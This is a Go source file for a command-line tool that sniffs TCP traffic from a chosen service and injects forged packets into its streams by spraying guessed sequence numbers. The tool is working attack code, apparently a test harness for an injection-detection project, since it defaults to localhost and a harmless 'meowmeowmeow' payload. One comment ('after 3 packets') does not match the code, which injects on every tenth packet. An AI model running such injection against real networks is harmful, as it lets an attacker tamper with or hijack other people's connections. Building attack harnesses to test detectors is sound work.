/*
 *    probabalistic/sloppy TCP stream injection based on observed TCP sequences
 *
 *    Copyright (C) 2014, 2015  David Stainton
 *
 *    This program is free software: you can redistribute it and/or modify
 *    it under the terms of the GNU General Public License as published by
 *    the Free Software Foundation, either version 3 of the License, or
 *    (at your option) any later version.
 *
 *    This program is distributed in the hope that it will be useful,
 *    but WITHOUT ANY WARRANTY; without even the implied warranty of
 *    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 *    GNU General Public License for more details.
 *
 *    You should have received a copy of the GNU General Public License
 *    along with this program.  If not, see <http://www.gnu.org/licenses/>.
 */

package main

import (
	"flag"
	"fmt"
	"github.com/david415/HoneyBadger/attack"
	"github.com/david415/HoneyBadger/types"
	"github.com/google/gopacket"
	"github.com/google/gopacket/examples/util"
	"github.com/google/gopacket/layers"
	"github.com/google/gopacket/pcap"
	"log"
	"net"
)

var iface = flag.String("i", "lo", "Interface to get packets from")
var filter = flag.String("f", "tcp", "BPF filter for pcap")
var snaplen = flag.Int("s", 65536, "SnapLen for pcap packet capture")
var serviceIPstr = flag.String("d", "127.0.0.1", "target TCP flows from this IP address")
var servicePort = flag.Int("e", 9666, "target TCP flows from this port")

func main() {
	defer util.Run()()

	var eth layers.Ethernet
	var dot1q layers.Dot1Q
	var ip4 layers.IPv4
	var ip6 layers.IPv6
	var ip6extensions layers.IPv6ExtensionSkipper
	var tcp layers.TCP
	var payload gopacket.Payload
	decoded := make([]gopacket.LayerType, 0, 4)

	// target/track all TCP flows from this TCP/IP service endpoint
	trackedFlows := make(map[types.TcpIpFlow]int)
	serviceIP := net.ParseIP(*serviceIPstr)
	if serviceIP == nil {
		panic(fmt.Sprintf("non-ip target: %q\n", serviceIPstr))
	}
	serviceIP = serviceIP.To4()
	if serviceIP == nil {
		panic(fmt.Sprintf("non-ipv4 target: %q\n", serviceIPstr))
	}

	streamInjector := attack.TCPStreamInjector{}
	err := streamInjector.Init("0.0.0.0")
	if err != nil {
		panic(err)
	}
	streamInjector.Payload = []byte("meowmeowmeow")

	handle, err := pcap.OpenLive(*iface, int32(*snaplen), true, pcap.BlockForever)
	if err != nil {
		log.Fatal("error opening pcap handle: ", err)
	}
	if err := handle.SetBPFFilter(*filter); err != nil {
		log.Fatal("error setting BPF filter: ", err)
	}
	parser := gopacket.NewDecodingLayerParser(layers.LayerTypeEthernet,
		&eth, &dot1q, &ip4, &ip6, &ip6extensions, &tcp, &payload)
	flow := &types.TcpIpFlow{}

	log.Print("collecting packets...\n")

	for {
		data, ci, err := handle.ZeroCopyReadPacketData()
		if err != nil {
			log.Printf("error getting packet: %v %s", err, ci)
			continue
		}
		err = parser.DecodeLayers(data, &decoded)
		if err != nil {
			log.Printf("error decoding packet: %v", err)
			continue
		}

		// if we see a flow coming from the tcp/ip service we are watching
		// then track how many packets we receive from each flow
		if tcp.SrcPort == layers.TCPPort(*servicePort) && ip4.SrcIP.Equal(serviceIP) {
			flow = types.NewTcpIpFlowFromLayers(ip4, tcp)
			_, isTracked := trackedFlows[*flow]
			if isTracked {
				trackedFlows[*flow] += 1
			} else {
				trackedFlows[*flow] = 1
			}
		} else {
			continue
		}

		// after 3 packets from a given flow then inject packets into the stream
		if trackedFlows[*flow]%10 == 0 {
			err = streamInjector.SetIPLayer(ip4)
			if err != nil {
				panic(err)
			}
			streamInjector.SetTCPLayer(tcp)
			err = streamInjector.SpraySequenceRangePackets(tcp.Seq, 20)
			if err != nil {
				panic(err)
			}
			log.Print("packet spray sent!\n")
		}
	}
}
